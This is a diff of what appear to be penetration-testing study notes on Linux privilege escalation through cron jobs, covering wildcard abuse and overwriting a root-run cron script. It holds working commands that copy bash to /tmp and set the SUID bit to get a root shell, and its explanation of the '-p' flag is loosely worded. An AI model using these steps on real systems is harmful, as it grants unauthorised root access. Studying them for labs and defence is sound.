@@ -875,6 +875,7 @@ cd /home/raj/script
 - cat to see the code in the cron job script, to see if there is any wildcard we can use
 - find the directory that the cronjob task is run at e.g. /home/user
 - find the wildcard(*) in the cronjob script
+- The -p tells the terminal to execute a binary but with permissions of the owner(in our case root).
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh           # if runme.sh doesn’t exist, make it exist
 chmod +x runme.sh
@@ -887,9 +888,9 @@ id
 whoami
 ```
 
-8. cronjob cron path (overwriting cron script)
+8. cronjob cron file overwrite
 - Detection: cat /etc/crontab, find cron job that run every 1-2 min as root
-- locate overwrite.sh to overwrite the script in overwrite.sh (usually found in user’s home directory)
+- 'locate overwrite.sh' to overwrite the script in overwrite.sh (usually found in user’s home directory)
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh            # if overwrite.sh doesn’t exist, make it exist
 chmod +x /home/user/overwrite.sh
